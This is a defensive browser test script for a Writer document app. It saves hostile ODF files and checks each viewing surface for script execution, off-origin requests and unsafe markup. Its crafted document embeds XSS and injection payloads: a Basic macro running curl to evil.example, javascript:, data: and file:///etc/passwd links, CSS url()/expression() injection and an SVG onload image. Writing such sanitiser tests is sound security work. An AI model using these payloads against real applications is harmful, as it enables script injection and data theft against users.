#!/usr/bin/env node
//  ui-writer-hostile.mjs: hostile Writer documents on every surface that
//  shows one (Writer plan, Task 13).
//
//  Each file of tests/writer/corpus/hostile, plus one crafted here with the
//  link schemes, style names and opaque parts the corpus files do not carry,
//  is saved as a fodt page and shared clearweb, then shown in:
//    the editor (a tab), the preview frame, the urb:// reader, /c, the /x
//    view, and page-source?render=1 (what the editor shows before writer.js)
//  The crafted document's macros are named in the page menu, never run.
//  On each surface it asserts:
//    no script from the document runs (window.__PWNED, in every frame),
//    no request leaves the ship's origin (request interception),
//    no element carries a handler, a script or an unsafe href or src, and no
//      style reaches url(), expression() or a closing style tag,
//    the surface shows the refusal note or the document's safe text,
//  and, once all are shown, that no fiber crashed (/rise.json).
//
//  A peer's shared page is the same body on the same paths: the reader
//  renders a peer's %fodt mark with +fodt-make, the function our own pages
//  use, and a peer on this build publishes the render as %html, which the
//  reader always frames sandboxed for a peer. The real two-ship read is
//  fodt-views.sh with B_URL.
//
//  Usage: LATTICE_URL=http://localhost:<port> LATTICE_COOKIE=<cookie file> \
//           node scripts/ui-writer-hostile.mjs
//  Never run against production. Everything it writes is under one folder
//  and deleted at the end.
import { readFileSync, readdirSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';
import { shipEnv, launchBrowser, openPage, makeCheck, waitFor, swControlled, shipName } from './lib/harness.mjs';

const env = shipEnv();
const RUN = 'uiwhostile-' + process.pid;
const here = dirname(fileURLToPath(import.meta.url));
const HDIR = join(here, '..', 'tests', 'writer', 'corpus', 'hostile');
const check = makeCheck();
const ORIGIN = new URL(env.base).origin;
const INST = '/apps/shell/desks/lattice.desk/desk/data/lattice.lattice_app';

//  The crafted document: what the corpus files leave out. Every payload
//  sets window.__PWNED or names evil.example, so either shows up if it lands.
const NS = 'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
  + 'xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" '
  + 'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
  + 'xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" '
  + 'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
  + 'xmlns:xlink="http://www.w3.org/1999/xlink" '
  + 'xmlns:dc="http://purl.org/dc/elements/1.1/" '
  + 'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
  + 'xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0"';
const link = (href, t) => `<text:a xlink:type="simple" xlink:href="${href}">${t}</text:a>`;
const CRAFTED = `<?xml version="1.0" encoding="UTF-8"?>
<office:document ${NS} office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
<office:meta><dc:title>&lt;/title&gt;&lt;script&gt;window.__PWNED=1&lt;/script&gt;</dc:title></office:meta>
<office:scripts><office:script script:language="ooo:Basic">Sub Main
Shell("curl https://evil.example/x")
End Sub</office:script><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/></office:event-listeners></office:scripts>
<office:styles>
<style:style style:name="X&quot;]{}*{background:url(https://evil.example/s.png)}" style:display-name="&lt;img src=x onerror=window.__PWNED=1&gt;" style:family="paragraph"><style:text-properties fo:color="red;background:url(https://evil.example/c.png)" fo:font-size="12pt}*{background:url(https://evil.example/f.png)}" style:font-name="x&apos;);background:url(https://evil.example/n.png);(&apos;"/><style:paragraph-properties fo:background-color="url(https://evil.example/b.png)" fo:margin-left="expression(window.__PWNED=1)"/></style:style>
</office:styles>
<office:body><office:text>
<text:h text:outline-level="1">Crafted heading</text:h>
<text:p text:style-name="X&quot;]{}*{background:url(https://evil.example/s.png)}">Crafted body text.</text:p>
<text:p>${link('data:text/html,&lt;script&gt;parent.__PWNED=1&lt;/script&gt;', 'data link')} ${link('macro:///Standard.Module1.Main', 'macro link')} ${link('.uno:Open', 'uno link')} ${link('vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document', 'script link')} ${link('&#x6a;&#x61;vascript:window.__PWNED=1', 'hex javascript')} ${link('java&#9;script:window.__PWNED=1', 'tab javascript')} ${link(' javascript:window.__PWNED=1', 'space javascript')} ${link('//evil.example/x', 'protocol relative')} ${link('file:///etc/passwd', 'file link')}</text:p>
<text:p><text:a xlink:type="simple" xlink:href="https://example.org/"><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:mouseover" xlink:href="vnd.sun.star.script:x"/></office:event-listeners>listener link</text:a></text:p>
<text:section text:name="Linked"><text:section-source xlink:href="https://evil.example/linked.fodt" text:filter-name="writer8"/><text:p>linked section</text:p></text:section>
<text:p><draw:frame draw:name="i" svg:width="1in" svg:height="1in"><draw:image><office:binary-data>PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiLz4=</office:binary-data></draw:image></draw:frame><draw:frame draw:name="j" svg:width="1in" svg:height="1in"><draw:image xlink:href="https://evil.example/t.png" xlink:type="simple"/></draw:frame></text:p>
<text:p><office:annotation><dc:creator>&lt;script&gt;window.__PWNED=1&lt;/script&gt;</dc:creator><text:p>&lt;img src=x onerror=window.__PWNED=1&gt;</text:p></office:annotation>annotated</text:p>
<text:p>&lt;script&gt;window.__PWNED=1&lt;/script&gt; tail text</text:p>
</office:text></office:body></office:document>
`;

//  what each file should show: a word of its safe text, or the refusal
//  (a DOCTYPE with a subset, any ENTITY, and depth past 256 are refused)
const REFUSED = new Set(['billion-laughs', 'doctype-entity', 'external-entity', 'deep-nesting']);
//  refused by the editor only: the ship's renderer spells out at most 100
//  spaces a text:s, so its surfaces show the sheet
const EDITOR_REFUSED = new Set(['space-bomb']);
const files = readdirSync(HDIR).filter((f) => f.endsWith('.fodt')).sort()
  .map((f) => [f.replace(/\.fodt$/, ''), readFileSync(join(HDIR, f), 'utf8')]);
files.push(['crafted', CRAFTED]);
const word = {
  'bad-links': 'javascript', 'external-image': '', 'script-iframe': '', 'style-injection': '', 'space-bomb': 'spaced',
  crafted: 'Crafted heading',
};

const api = (path, init = {}) => fetch(env.base + '/apps/lattice/' + path,
  { ...init, headers: { Cookie: env.cookie, ...(init.headers || {}) } });
const riseUrl = env.base + '/grubbery/ball' + INST + '/rise.json?raw=1';
const rise = async () => {
  const r = await fetch(riseUrl, { headers: { Cookie: env.cookie }, redirect: 'follow' });
  const t = await r.text();
  try { return JSON.parse(t); } catch { return {}; }
};

//  The DOM audit, run in a document (or a frame's): what a hostile body must
//  never leave behind. Returns a list of findings, empty when clean. The
//  app's own scripts are fine; a script whose text names the payload is not.
function audit() {
  const bad = [];
  const unsafe = /^\s*(javascript|data|file|vbscript|macro|vnd\.sun\.star\.script|\.uno)\s*:/i;
  const evil = /evil\.example|__PWNED|\/etc\/(passwd|hostname)/;
  for (const el of document.querySelectorAll('*')) {
    for (const a of el.attributes) {
      const n = a.name.toLowerCase(), v = a.value;
      if (n.startsWith('on') && evil.test(v)) bad.push(el.tagName + ' ' + n);
      //  a link may point off-site (it is followed only on a click), but
      //  never at a script scheme; anything that fetches by itself may not
      //  point off-site at all. srcdoc is audited as its own document.
      if (['href', 'xlink:href', 'action', 'formaction'].includes(n) && unsafe.test(v.replace(/[\t\n\r]/g, '')))
        bad.push(el.tagName + ' ' + n + '=' + v.slice(0, 60));
      if (['src', 'data', 'poster'].includes(n) && (unsafe.test(v) || evil.test(v)))
        bad.push(el.tagName + ' ' + n + '=' + v.slice(0, 60));
      if (n === 'style' && (/url\s*\(|expression\s*\(/i.test(v))) bad.push(el.tagName + ' style ' + v.slice(0, 60));
    }
    const t = el.tagName.toLowerCase();
    if (t === 'script' && evil.test(el.textContent)) bad.push('script ' + el.textContent.slice(0, 60));
    if (t === 'style' && /evil\.example|expression\s*\(|__PWNED/.test(el.textContent)) bad.push('style ' + el.textContent.slice(0, 60));
    if (['iframe', 'object', 'embed', 'img', 'svg', 'image'].includes(t)) {
      const s = el.getAttribute('src') || el.getAttribute('data') || '';
      if (evil.test(s) || /^data:image\/svg/i.test(s)) bad.push(t + ' ' + s.slice(0, 60));
    }
  }
  return bad;
}
//  audit an HTML string the same way, in an inert document
function auditHtml(html) {
  const d = new DOMParser().parseFromString(html, 'text/html');
  const bad = [];
  for (const s of d.querySelectorAll('script')) if (/evil\.example|__PWNED/.test(s.textContent)) bad.push('script');
  for (const el of d.querySelectorAll('*')) {
    for (const a of el.attributes) {
      const n = a.name.toLowerCase(), v = a.value;
      if (n.startsWith('on')) bad.push(el.tagName + ' ' + n);
      if (['href', 'src', 'xlink:href', 'action', 'data'].includes(n)
        && /^\s*(javascript|data|file|vbscript|macro|vnd\.sun\.star\.script|\.uno)\s*:/i.test(v.replace(/[\t\n\r]/g, '')))
        bad.push(el.tagName + ' ' + n + '=' + v.slice(0, 60));
      if (n === 'style' && /url\s*\(|expression\s*\(|<\/style/i.test(v)) bad.push(el.tagName + ' style');
    }
    if (['iframe', 'object', 'embed', 'img', 'svg', 'form', 'input', 'link', 'meta', 'base'].includes(el.tagName.toLowerCase())
      && !el.closest('head')) bad.push('element ' + el.tagName);
  }
  return bad;
}

// ------------------------------------------------------------------ setup
const ship = await shipName(env);
const rise0 = JSON.stringify(await rise());
for (const [n, body] of files) {
  const r = await api('page-save?type=fodt&new=1&name=' + encodeURIComponent(RUN + '/' + n), { method: 'POST', body });
  check('setup: ' + n + ' saves as a fodt page', r.status === 200, String(r.status));
  await api('page-share?mode=clearweb&name=' + encodeURIComponent(RUN + '/' + n), { method: 'POST' });
}

const browser = await launchBrowser({ args: ['--disable-dev-shm-usage'] });
const page = await openPage(browser, env, {
  viewport: { width: 1300, height: 900 },
  onPageError: (e) => { if (/PWNED/.test(e.message)) check('a document threw into the app: ' + e.message.slice(0, 120), false); },
});
let offsite = [];
await page.setRequestInterception(true);
page.on('request', (r) => {
  const u = r.url();
  const ok = u.startsWith(ORIGIN) || u.startsWith('data:') || u.startsWith('blob:') || u === 'about:blank' || u.startsWith('about:srcdoc');
  if (!ok) offsite.push(u);
  (ok ? r.continue() : r.abort()).catch(() => {});
});
let dialogs = 0;
page.on('dialog', (d) => { dialogs++; d.dismiss().catch(() => {}); });

const pwned = async () => {
  for (const f of page.frames()) {
    try { if (await f.evaluate(() => !!window.__PWNED || !!(window.parent && window.parent.__PWNED))) return true; } catch { /* opaque */ }
  }
  return false;
};
const auditFrames = async () => {
  const out = [];
  for (const f of page.frames()) {
    try {
      out.push(...await f.evaluate(audit));
      //  a sandboxed frame is opaque to evaluate: audit its srcdoc instead
      const docs = await f.evaluate(() => [...document.querySelectorAll('iframe[srcdoc]')].map((e) => e.getAttribute('srcdoc')));
      for (const d of docs) out.push(...(await page.evaluate(auditHtml, d)).map((b) => 'srcdoc: ' + b));
    } catch { /* an opaque frame is audited from its parent's srcdoc */ }
  }
  return out;
};
//  one surface: findings, script runs, off-origin requests, dialogs
async function surface(label, show) {
  offsite = []; dialogs = 0;
  let shown = '';
  try { shown = await show(); } catch (e) { check(label + ': loads', false, e.message.slice(0, 120)); return; }
  await new Promise((r) => setTimeout(r, 800));
  const bad = await auditFrames();
  check(label + ': nothing from the document runs', !(await pwned()) && dialogs === 0, 'dialogs ' + dialogs);
  check(label + ': no request leaves the origin', offsite.length === 0, offsite.slice(0, 3).join(' '));
  check(label + ': no live handler, script, unsafe link or style', bad.length === 0, bad.slice(0, 3).join(' | '));
  return shown;
}

await page.goto(env.app, { waitUntil: 'domcontentloaded' });
await swControlled(page);
await page.waitForFunction(() => window.latTabs && document.getElementById('src'), { timeout: 60000 });
await page.evaluate(() => { localStorage.latAutosave = '0'; });

const fwait = (fn, ...a) => page.waitForFunction(fn, { timeout: 60000 }, ...a);
for (const [n] of files) {
  const name = RUN + '/' + n;
  const refused = REFUSED.has(n);

  // the editor: a tab, writer.js mounted or the refusal note with the XML
  await surface('editor ' + n, async () => {
    await page.evaluate((p) => window.latTabs.openIn('page', p), name);
    await fwait((p) => document.getElementById('pname').value === p, name);
    await fwait(() => !!document.querySelector('lat-writer:not([hidden]) .lw-doc')
      || [...document.querySelectorAll('.lnkcf')].some((e) => !e.hidden && /cannot open/i.test(e.textContent)));
    const st = await page.evaluate(() => ({
      writer: !!document.querySelector('lat-writer:not([hidden]) .lw-doc'),
      text: (document.querySelector('lat-writer .lw-doc') || {}).textContent || '',
      note: [...document.querySelectorAll('.lnkcf')].filter((e) => !e.hidden).map((e) => e.textContent).join(' '),
    }));
    if (refused || EDITOR_REFUSED.has(n)) check('editor ' + n + ': refused, shown as XML with the reason', !st.writer && /cannot open/i.test(st.note), st.note.slice(0, 100));
    else check('editor ' + n + ': opens in the editor', st.writer && (!word[n] || st.text.includes(word[n])), st.note.slice(0, 100));
    if (st.writer) {
      // hover and click every link: none may navigate or run anything
      const before = page.url();
      const n2 = await page.evaluate(() => document.querySelectorAll('lat-writer .lw-doc a, lat-writer .lw-doc [data-href]').length);
      for (let i = 0; i < n2; i++) {
        const h = await page.evaluateHandle((j) => document.querySelectorAll('lat-writer .lw-doc a, lat-writer .lw-doc [data-href]')[j], i);
        try { await h.hover(); await h.click(); } catch { /* off screen */ }
      }
      check('editor ' + n + ': clicking its links goes nowhere', page.url() === before);
      const live = await page.evaluate(() => [...document.querySelectorAll('lat-writer a[href]')].map((a) => a.getAttribute('href'))
        .filter((h) => !/^(https?:|mailto:|urb:|#|\/|\.)/i.test(h) || /^\/\//.test(h)));
      check('editor ' + n + ': only safe links are live', live.length === 0, live.join(' '));
      if (n === 'crafted') {
        // a document with Basic macros says so in the page menu, and the
        // item does nothing (spec, Security: macros)
        const mi = await page.evaluate(() => {
          document.getElementById('tmenu').click();
          const b = document.querySelector('.tmenu [data-mi="macros"]');
          const r = b ? { text: b.textContent, disabled: b.disabled } : null;
          document.getElementById('tmenu').click();
          return r;
        });
        check('editor crafted: the page menu says it contains macros, never run', !!mi && /macros/i.test(mi.text) && mi.disabled, JSON.stringify(mi));
      }
    }
  });

  // the preview frame: local paint from writer.js, sandboxed without same-origin
  await surface('preview ' + n, async () => {
    const pv = await page.evaluate(() => {
      const f = document.getElementById('prev');
      return { sandbox: f ? f.getAttribute('sandbox') || '' : 'none', doc: f ? f.getAttribute('srcdoc') || '' : '' };
    });
    check('preview ' + n + ': the frame is sandboxed without same-origin',
      /allow-scripts/.test(pv.sandbox) && !/allow-same-origin/.test(pv.sandbox), pv.sandbox);
    if (pv.doc) {
      const bad = await page.evaluate(auditHtml, pv.doc);
      check('preview ' + n + ': its document is inert', bad.length === 0, bad.slice(0, 3).join(' | '));
    }
  });

  // page-source?render=1: the ship's render, which the editor shows first
  const src = await (await api('page-source?render=1&name=' + encodeURIComponent(name))).json();
  const frag = src.html || '';
  const bad = await page.evaluate(auditHtml, frag.replace(/<script>[\s\S]*?<\/script>/g, (s) => /PWNED|evil/.test(s) ? s : ''));
  check('render=1 ' + n + ': safe output', bad.length === 0, bad.slice(0, 3).join(' | '));
  check('render=1 ' + n + ': ' + (refused ? 'the note' : 'the sheet'),
    refused ? /fodt-note/.test(frag) : /class="fodt"/.test(frag), frag.slice(0, 80));
  check('render=1 ' + n + ': never raw XML', !/office:|text:p|style:name/.test(frag));

  // the urb:// reader (the %html branch: a published fodt page is its render)
  await surface('reader ' + n, async () => {
    await page.goto(env.base + '/apps/lattice?url=' + encodeURIComponent('urb://' + ship + '/' + name), { waitUntil: 'load', timeout: 120000 });
    const body = await page.content();
    check('reader ' + n + ': never raw XML', !/office:document|&lt;office:/.test(body));
  });

  // /c, the clearweb view (it waits for the held publish)
  await surface('/c ' + n, async () => {
    const want = refused ? 'fodt-note' : 'class="fodt"';
    const got = await waitFor(async () => {
      const r = await fetch(env.base + '/apps/lattice/c/' + name);
      const t = await r.text();
      return t.includes(want) ? t : null;
    }, 90000, 2000);
    check('/c ' + n + ': published as its render', !!got);
    await page.goto(env.base + '/apps/lattice/c/' + name, { waitUntil: 'load', timeout: 120000 });
    const body = await page.content();
    check('/c ' + n + ': never raw XML', !/office:document|&lt;office:/.test(body));
    // the published copy is what a peer on any release inlines or frames:
    // it must be inert on its own
    const v = await (await api('fetch?url=' + encodeURIComponent('urb://' + ship + '/' + name))).json().catch(() => ({}));
    const vb = await page.evaluate(auditHtml, v.body || '');
    check('/c ' + n + ': the published copy is inert HTML', !!v.body && vb.length === 0 && !/office:/.test(v.body), vb.slice(0, 3).join(' | '));
  });

  // the /x view
  await surface('/x ' + n, async () => {
    await page.goto(env.base + '/apps/lattice/x/' + ship + INST + '/page/' + name + '/', { waitUntil: 'load', timeout: 120000 });
  });

  await page.goto(env.app, { waitUntil: 'domcontentloaded' });
  await page.waitForFunction(() => window.latTabs && document.getElementById('src'), { timeout: 60000 });
}

const rise1 = JSON.stringify(await rise());
check('no fiber crashed (/rise.json unchanged)', rise1 === rise0, rise1.slice(0, 200));

await browser.close().catch(() => {});
await api('page-del?name=' + encodeURIComponent(RUN), { method: 'POST' }).catch(() => {});
check.done();
